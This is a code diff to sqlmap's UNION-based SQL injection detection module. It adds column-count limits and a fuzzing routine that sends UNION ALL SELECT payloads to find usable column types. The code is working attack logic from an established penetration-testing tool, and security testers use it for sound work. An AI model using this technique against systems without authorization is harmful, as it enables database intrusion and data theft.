@@ -1,10 +1,11 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
+import itertools
 import logging
 import random
 import re
@@ -12,6 +13,7 @@ import re
 from lib.core.agent import agent
 from lib.core.common import average
 from lib.core.common import Backend
+from lib.core.common import getPublicTypeMembers
 from lib.core.common import isNullValue
 from lib.core.common import listToStrValue
 from lib.core.common import popValue
@@ -29,15 +31,20 @@ from lib.core.compat import xrange
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
+from lib.core.data import queries
 from lib.core.decorators import stackedmethod
 from lib.core.dicts import FROM_DUMMY_TABLE
+from lib.core.enums import FUZZ_UNION_COLUMN
 from lib.core.enums import PAYLOAD
+from lib.core.settings import FUZZ_UNION_ERROR_REGEX
+from lib.core.settings import FUZZ_UNION_MAX_COLUMNS
 from lib.core.settings import LIMITED_ROWS_TEST_NUMBER
 from lib.core.settings import MAX_RATIO
 from lib.core.settings import MIN_RATIO
 from lib.core.settings import MIN_STATISTICAL_RANGE
 from lib.core.settings import MIN_UNION_RESPONSES
 from lib.core.settings import NULL
+from lib.core.settings import ORDER_BY_MAX
 from lib.core.settings import ORDER_BY_STEP
 from lib.core.settings import UNION_MIN_RESPONSE_CHARS
 from lib.core.settings import UNION_STDEV_COEFF
@@ -74,6 +81,9 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
                 if not conf.uCols and _orderByTest(highCols):
                     lowCols = highCols
                     highCols += ORDER_BY_STEP
+
+                    if highCols > ORDER_BY_MAX:
+                        break
                 else:
                     while not found:
                         mid = highCols - (highCols - lowCols) // 2
@@ -94,6 +104,7 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
 
         if kb.orderByColumns is None and (lowerCount == 1 or conf.uCols):  # Note: ORDER BY is not bullet-proof
             found = _orderByTechnique(lowerCount, upperCount) if conf.uCols else _orderByTechnique()
+
             if found:
                 kb.orderByColumns = found
                 infoMsg = "target URL appears to have %d column%s in query" % (found, 's' if found > 1 else "")
@@ -112,8 +123,10 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
             query = agent.forgeUnionQuery('', -1, count, comment, prefix, suffix, kb.uChar, where)
             payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
             page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)
+
             if not isNullValue(kb.uChar):
                 pages[count] = page
+
             ratio = comparison(page, headers, code, getRatioValue=True) or MIN_RATIO
             ratios.append(ratio)
             min_, max_ = min(min_, ratio), max(max_, ratio)
@@ -167,6 +180,36 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
 
     return retVal
 
+def _fuzzUnionCols(place, parameter, prefix, suffix):
+    retVal = None
+
+    if Backend.getIdentifiedDbms() and not re.search(FUZZ_UNION_ERROR_REGEX, kb.pageTemplate or "") and kb.orderByColumns:
+        comment = queries[Backend.getIdentifiedDbms()].comment.query
+
+        choices = getPublicTypeMembers(FUZZ_UNION_COLUMN, True)
+        random.shuffle(choices)
+
+        for candidate in itertools.product(choices, repeat=kb.orderByColumns):
+            if retVal:
+                break
+            elif FUZZ_UNION_COLUMN.STRING not in candidate:
+                continue
+            else:
+                candidate = [_.replace(FUZZ_UNION_COLUMN.INTEGER, str(randomInt())).replace(FUZZ_UNION_COLUMN.STRING, "'%s'" % randomStr(20)) for _ in candidate]
+
+            query = agent.prefixQuery("UNION ALL SELECT %s%s" % (','.join(candidate), FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), "")), prefix=prefix)
+            query = agent.suffixQuery(query, suffix=suffix, comment=comment)
+            payload = agent.payload(newValue=query, place=place, parameter=parameter, where=PAYLOAD.WHERE.NEGATIVE)
+            page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)
+
+            if not re.search(FUZZ_UNION_ERROR_REGEX, page or ""):
+                for column in candidate:
+                    if column.startswith("'") and column.strip("'") in (page or ""):
+                        retVal = [(_ if _ != column else "%s") for _ in candidate]
+                        break
+
+    return retVal
+
 def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL):
     validPayload = None
     vector = None
@@ -201,7 +244,7 @@ def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLO
             if content and phrase in content:
                 validPayload = payload
                 kb.unionDuplicates = len(re.findall(phrase, content, re.I)) > 1
-                vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, conf.forcePartial)
+                vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, conf.forcePartial, kb.tableFrom, kb.unionTemplate)
 
                 if where == PAYLOAD.WHERE.ORIGINAL:
                     # Prepare expression with delimiters
@@ -219,7 +262,7 @@ def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLO
                     content = ("%s%s" % (page or "", listToStrValue(headers.headers if headers else None) or "")).lower()
 
                     if not all(_ in content for _ in (phrase, phrase2)):
-                        vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)
+                        vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True, kb.tableFrom, kb.unionTemplate)
                     elif not kb.unionDuplicates:
                         fromTable = " FROM (%s) AS %s" % (" UNION ".join("SELECT %d%s%s" % (_, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), ""), " AS %s" % randomStr() if _ == 0 else "") for _ in xrange(LIMITED_ROWS_TEST_NUMBER)), randomStr())
 
@@ -232,8 +275,8 @@ def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLO
                         content = ("%s%s" % (removeReflectiveValues(page, payload) or "", removeReflectiveValues(listToStrValue(headers.headers if headers else None), payload, True) or "")).lower()
                         if content.count(phrase) > 0 and content.count(phrase) < LIMITED_ROWS_TEST_NUMBER:
                             warnMsg = "output with limited number of rows detected. Switching to partial mode"
-                            logger.warn(warnMsg)
-                            vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)
+                            logger.warning(warnMsg)
+                            vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True, kb.tableFrom, kb.unionTemplate)
 
                 unionErrorCase = kb.errorIsNone and wasLastResponseDBMSError()
 
@@ -241,7 +284,7 @@ def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLO
                     warnMsg = "combined UNION/error-based SQL injection case found on "
                     warnMsg += "column %d. sqlmap will try to find another " % (position + 1)
                     warnMsg += "column with better characteristics"
-                    logger.warn(warnMsg)
+                    logger.warning(warnMsg)
                 else:
                     break
 
@@ -273,17 +316,27 @@ def _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
     vector = None
     orderBy = kb.orderByColumns
     uChars = (conf.uChar, kb.uChar)
+    where = PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE
 
     # In case that user explicitly stated number of columns affected
     if conf.uColsStop == conf.uColsStart:
         count = conf.uColsStart
     else:
-        count = _findUnionCharCount(comment, place, parameter, value, prefix, suffix, PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE)
+        count = _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where)
 
     if count:
         validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)
 
-        if not all((validPayload, vector)) and not all((conf.uChar, conf.dbms)):
+        if not all((validPayload, vector)) and not all((conf.uChar, conf.dbms, kb.unionTemplate)):
+            if Backend.getIdentifiedDbms() and kb.orderByColumns and kb.orderByColumns < FUZZ_UNION_MAX_COLUMNS:
+                if kb.fuzzUnionTest is None:
+                    msg = "do you want to (re)try to find proper "
+                    msg += "UNION column types with fuzzy test? [y/N] "
+
+                    kb.fuzzUnionTest = readInput(msg, default='N', boolean=True)
+                    if kb.fuzzUnionTest:
+                        kb.unionTemplate = _fuzzUnionCols(place, parameter, prefix, suffix)
+
             warnMsg = "if UNION based SQL injection is not detected, "
             warnMsg += "please consider "
 
